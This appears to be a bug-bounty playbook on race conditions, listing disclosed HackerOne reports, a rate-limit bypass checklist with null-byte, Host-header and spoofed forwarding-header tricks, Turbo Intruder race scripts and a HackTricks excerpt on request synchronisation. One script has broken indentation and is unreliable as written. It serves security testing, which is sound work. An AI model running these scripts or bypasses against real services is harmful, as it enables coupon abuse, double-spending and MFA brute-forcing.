# Real-World Playbook — Race Conditions

**Class:** `race-condition` · **Coverage-matrix tier:** 2 · **Hunter2:** /race · tools/h1_race.py · business-logic-hunter · **Skill:** race-conditions
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed Race Conditions reports peak at **$5,000**. Rewarded across: Chaturbate, Cosmos, Dropbox, Figma, HackerOne, Helium, InnoGames, Internet Bug Bounty.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Race condition in faucet when using starport** — Cosmos, $5,000 · 60👍 · [1438052](https://hackerone.com/reports/1438052)
- **Race Condition Enables Bypassing Verification Check** — Tools for Humanity, $3,000 · 95👍 · [2110030](https://hackerone.com/reports/2110030)
- **[curl] CVE-2023-32001: fopen race condition** — Internet Bug Bounty, $2,480 · 21👍 · [2078571](https://hackerone.com/reports/2078571)
- **Race condition in activating email resulting in infinite amount of diamonds received** — InnoGames, $2,000 · 137👍 · [509629](https://hackerone.com/reports/509629)
- **Adobe Flash Player Race Condition Vulnerability** — Internet Bug Bounty, $2,000 · 5👍 · [119657](https://hackerone.com/reports/119657)
- **Race condition на market.games.mail.ru** — Mail.ru, $1,000 · 31👍 · [317557](https://hackerone.com/reports/317557)
- **Race Condition Vulnerability On Pornhubpremium.com** — Pornhub, $520 · 13👍 · [183624](https://hackerone.com/reports/183624)
- **Race condition in joining CTF group** — HackerOne, $500 · 72👍 · [1540969](https://hackerone.com/reports/1540969)
- **Race condition at create new Location** — Shopify, $500 · 36👍 · [413759](https://hackerone.com/reports/413759)
- **CVE-2023-28320 - siglongjmp race condition** — Internet Bug Bounty, $480 · 7👍 · [1990421](https://hackerone.com/reports/1990421)
- **Race Condition of Transfer data Credits to Organization Leads to Add Extra free Data Credits to the Organization** — Helium, $250 · 74👍 · [974892](https://hackerone.com/reports/974892)
- **Race condition on https://judge.me/people** — Judge.me, $250 · 26👍 · [1566017](https://hackerone.com/reports/1566017)
- **Race Condition in Oauth 2.0 flow can lead to malicious applications create multiple valid sessions** — Razer, $250 · 8👍 · [699112](https://hackerone.com/reports/699112)
- **Race condition when redeeming coupon codes** — Dropbox, $216 · 5👍 · [59179](https://hackerone.com/reports/59179)
- **Race condition while removing the love react in community files.** — Figma, $150 · 45👍 · [996141](https://hackerone.com/reports/996141)
- **Bypass subdomain limits using race condition** — Chaturbate, $100 · 13👍 · [395351](https://hackerone.com/reports/395351)
- **Race Condition allows to redeem multiple times gift cards which leads to free "money"** — Reverb.com, $0 (disclosed) · 307👍 · [759247](https://hackerone.com/reports/759247)
- **Race condition in performing retest allows duplicated payments** — HackerOne, $0 (disclosed) · 239👍 · [429026](https://hackerone.com/reports/429026)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

Where to look for Bugs
```
- login
- reset password
- 2fA
- Confirmation codes
- Sign up
```

using Null Chars

```
%00, %0d%0a, %09, %0C, %20, %0
```
```
>brute force using abc@xyz.com
	after some time
	you got blocked
>try abc@xyz.com%00
```

Host Header injection

```
Change Host:www.newsite.com
Change Host:localhost
Change Host:127.0.0.1
```


Changing cookies
```
For example if it blocks by 15 Requests
Change session on 14 req and try 
```


X-forwaded-forwaded-For
```
X-Forwarded: <IP>
X-Forwarded-For: <IP>
X-Forwarded-Host: <IP>
X-Client-IP: <IP>
X-Remote-IP: <IP>
X-Remote-Addr: <IP>
X-Host: <IP>
X-Originating-IP: <IP>
```

X-forwaded-forwaded-For
```
add 2 headers
add Header X-Forwaded-For:
add Header X-Forwaded-For:198.168.43.1
```

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```
```
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')


       engine.start(timeout=5)
   engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
```
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    '''

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Race Condition


> [!WARNING]
> For obtaining a deep understanding of this technique check the original report in [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)<sup>[[1]](#references)</sup>

#### Enhancing Race Condition Attacks

The main hurdle in exploiting race conditions is ensuring that multiple requests reach the vulnerable state transition together, with **very little difference in processing time—ideally less than 1 ms**.<sup>[[15]](#references)</sup>

Here you can find some techniques for Synchronizing Requests:

###### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Supports sending two requests over a single TCP connection, reducing network jitter impact. However, due to server-side variations, two requests may not suffice for a consistent race condition exploit.
- **HTTP/1.1 'Last-Byte Sync'**: Enables the pre-sending of most parts of 20-30 requests, withholding a small fragment, which is then sent together, achieving simultaneous arrival at the server.

**Preparation for Last-Byte Sync** involves:

1. Sending headers and body data minus the final byte without ending the stream.
2. Pausing for 100ms post-initial send.
3. Disabling TCP_NODELAY to utilize Nagle's algorithm for batching final frames.

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Limit-overrun: redeem coupon/withdraw/transfer N× in parallel → money
- OTP/MFA submit race → brute past rate-limit
- TOCTOU on balance/state → double-spend

## Hunter2 wiring
- **Run:** `/race · tools/h1_race.py · business-logic-hunter`
- **Skill:** `race-conditions`
- **Coverage-matrix tier:** 2 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Race that only affects your own account/limits with no financial or security impact
- Overrun on a non-critical counter (likes, votes, view counts) — nothing tangible walked away with
- "Duplicate" requests that succeed but the backend later reconciles/rejects them (no net gain)
- MFA/OTP submit race that returned 200s but no OTP code was actually accepted
- Needs >2 simultaneous preconditions to line up, or single-packet timing you cannot reproduce

**Conditionally valid (only WITH a chain):** limit-overrun that redeems coupon / withdraws / transfers N× → money; TOCTOU on balance/state → double-spend; OTP/MFA submit race that brute-forces past the rate-limit.
